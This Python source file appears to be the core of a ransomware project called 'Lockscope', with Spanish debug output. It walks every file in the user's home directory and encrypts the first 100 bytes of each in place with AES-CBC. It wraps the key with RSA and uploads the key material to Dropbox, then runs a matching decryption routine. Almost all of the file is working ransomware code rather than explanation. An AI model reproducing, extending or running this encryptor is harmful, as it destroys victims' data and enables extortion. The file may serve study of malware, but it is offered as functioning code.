
import Asymmetric
import Walk_files
import Dropbox_integration
import os

from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes


class AEScipher:

    # Initialization of variables
    def __init__(self): 
        self.block_size = 32
        try:
            self.create_folder = os.mkdir(os.path.join(Walk_files.username(), "Lockscope"))
        except OSError:
            print("Error")

        self.key_path = os.path.join(Walk_files.username(), "Lockscope", "key.pkl")  
        self.size_bytes_path = os.path.join(Walk_files.username(), "Lockscope", "size_bytes.txt")  
        self.iv_path = os.path.join(Walk_files.username(), "Lockscope", "iv.txt")
        self.private_key_path =  os.path.join(Walk_files.username(), "Lockscope", "private_key.pem") 
        

    # Generate the AES key
    def generate_aes_key(self):
        aes_key = Random.new().read(self.block_size)
        
        return aes_key

    # Open the plain file and read data
    def open_file(self, path):
        try:
            with open(path, "rb") as f:
                f.seek(100)
                rest_content = f.read()
        
            with open(path, "rb") as f:
                cipher_data = f.read(100)

        except PermissionError:
            cipher_data = b""
            rest_content = b""
    
        return cipher_data, rest_content

    # Funtion to encrypt the data with AES key
    def encrypt(self):
        
        print("\n-----ENCRYPT FILE-----")

        aes_key = self.generate_aes_key()

        iv = get_random_bytes(16)

        with open(self.iv_path, "wb") as iv_file:
            iv_file.write(iv)

        cipher = AES.new(aes_key, AES.MODE_CBC, iv)
        
        for path in Walk_files.find_files(Walk_files.username()):
            cipher_data, rest_content = self.open_file(path)

            cipher_content = pad(cipher_data, self.block_size)
            
            print("\n")
            print("Contenido del archivo a cifrar:\n" , cipher_data)
            print("Resto del contenido del archivo:\n" , rest_content)
            print("Conenido del archivo a cifrar tras aplicar padding:\n" , cipher_content)
            print("Cantidad de carácteres tras aplicar padding:\n" , len(cipher_content))

            encrypted_data = cipher.encrypt(cipher_content)

            print("Contenido del archivo encriptado:\n" , encrypted_data)

            print("Cantidad de carácteres del archivo encriptado:\n" , len(encrypted_data))

            with open(self.size_bytes_path, "w") as content_size:
                content_size.write(str(len(encrypted_data)))

            concat_bytes = encrypted_data + rest_content

            print("\n")
            print("Contenido del archivo a cifrar una vez encriptado:\n" , encrypted_data)
            print("Resto del contenido del archivo:\n" , rest_content)

            try:
                with open(path, "wb") as encrypted_file:
                    encrypted_file.write(concat_bytes)
            except PermissionError:
                print ("Error")
            except OSError:
                print ("Error")
                
            print("\nContenido del archivo al completo una vez cifrado:\n" , concat_bytes)

            concat_bytes = b'\x00'
            encrypted_data = b'\x00'
            cipher_content = b'\x00'
            cipher_data = b'\x00'
            rest_content = b'\x00'

        public_key, private_key = Asymmetric.generate_rsa_keys()

        print("\n", public_key)
        print("\n", private_key)
        cipher_aes_key = Asymmetric.encrypt_aes_key(aes_key, public_key)

        Dropbox_integration.upload_files(cipher_aes_key, public_key, private_key)
        Dropbox_integration.download_files()


    # Open the cipher file and read data
    def open_file_encrypted(self, path):

        with open(self.size_bytes_path, "r") as content_size:
            size_encrypted_data = int(content_size.read())

        try:
            with open(path, "rb") as f:
                f.seek(size_encrypted_data)
                rest_content = f.read()
            
            with open(path, "rb") as f:
                cipher_data = f.read(size_encrypted_data)
        except PermissionError:
            cipher_data = b""
            rest_content = b""
        
        return cipher_data, rest_content
    
    # Funtion to decrypt the data with AES key
    def decrypt(self):
    
        print("\n-----DECRYPT FILE-----")

        with open(self.private_key_path, "rb") as private_key_file:
            private_key = private_key_file.read()
        
        with open(self.key_path, "rb") as key_file:
            cipher_aes_key = key_file.read()
        
        aes_key = Asymmetric.decrypt_aes_key(cipher_aes_key,private_key)

        with open(self.iv_path, "rb") as iv_file:
            iv = iv_file.read()

        cipher = AES.new(aes_key, AES.MODE_CBC, iv)

        for path in Walk_files.find_files(Walk_files.username()):
            
            cipher_data, rest_content = self.open_file_encrypted(path)

            print("\n")
            print("Contenido del archivo a cifrar una vez encriptado:\n" , cipher_data)
            print("Resto del contenido del archivo:\n" , rest_content)

            file_bytes_decrypted = cipher.decrypt(cipher_data)

            print("Contenido del archivo a cifrar una vez quitado el padding:\n" , file_bytes_decrypted)

            decrypted_data = unpad(file_bytes_decrypted, self.block_size)

            print("Contenido del archivo tras quitar el padding:\n" , decrypted_data)
            print("Cantidad de carácteres una vez quitado el padding:\n" , len(decrypted_data))

            concat_bytes_decrypted = decrypted_data + rest_content

            try:
                with open(path, "wb") as plain_file:
                    plain_file.write(concat_bytes_decrypted)
            except PermissionError:
                print("Error")
            except OSError:
                print ("Error")

            print("\nContenido del archivo al completo una vez descifrado:\n" , concat_bytes_decrypted)
        
            file_bytes_decrypted = b'\x00'
            decrypted_data = b'\x00'
            concat_bytes_decrypted = b'\x00'
            cipher_data = b'\x00'
            rest_content = b'\x00'
        

if __name__ == '__main__':
    cipher = AEScipher()
    try:
        cipher.encrypt()
        cipher.decrypt()

    except KeyboardInterrupt:
        exit(1)

